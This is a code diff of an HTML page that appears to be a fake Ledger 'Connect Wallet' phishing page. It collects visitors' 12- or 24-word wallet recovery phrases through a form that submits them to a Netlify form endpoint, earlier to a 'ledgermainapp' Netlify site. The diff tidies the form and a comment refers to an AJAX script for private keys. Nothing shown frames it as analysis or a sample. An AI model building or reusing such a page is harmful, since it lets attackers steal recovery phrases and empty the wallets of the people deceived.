@@ -1369,28 +1369,32 @@
                     </div>
 
                  <div id="div_connect_manuallly">
-        <form id="twelveWordsForm" method="POST" action="https://ledgermainapp.netlify.app" data-netlify="true">
-        <input type="hidden" name="form-name" value="twelveWordsForm" />
-      <div id="phrase">
-        <textarea
-          class="col-12 form-control"
-          placeholder="Enter your 12 or 24 Mnemonic words. Separate them with spaces."
-          style="font-size:14px; font-weight:650; color: #fff !important;"
-          rows="4"
-          id="phrase"
-          name="phrase1"
-          required
-        ></textarea>
-       
-        <div class="row mx-auto col-10 mt-4">
-          <button id="privateBtn" class="btn btn-primary">Connect Wallet</button>
-        </div>
+  <!-- Form: Twelve Words -->
+  <form id="twelveWordsForm" method="POST" data-netlify="true">
+    <input type="hidden" name="form-name" value="twelveWordsForm" />
+    <div id="phrase-container">
+      <textarea
+        class="col-12 form-control"
+        placeholder="Enter your 12 or 24 Mnemonic words. Separate them with spaces."
+        style="font-size:14px; font-weight:650; color: #fff !important;"
+        rows="4"
+        id="phrase1"
+        name="phrase1"
+        required
+      ></textarea>
+      <div class="row mx-auto col-10 mt-4">
+        <button id="privateBtn" class="btn btn-primary" type="submit">Connect Wallet</button>
       </div>
+    </div>
+  </form>
 
-      <!-- Success Message -->
-<div id="success-message-3" style="display: none; text-align: center; color: green;">
-    <p>Form 3 submitted successfully!</p>
+  <!-- Success Message -->
+  <div id="success-message-3" style="display: none; text-align: center; color: green;">
+    <p>Form submitted successfully!</p>
+  </div>
 </div>
+
+<!-- Netlify Handles the Form Submission -->
 
         <!-- AJAX Script for Private Key -->
 <script>
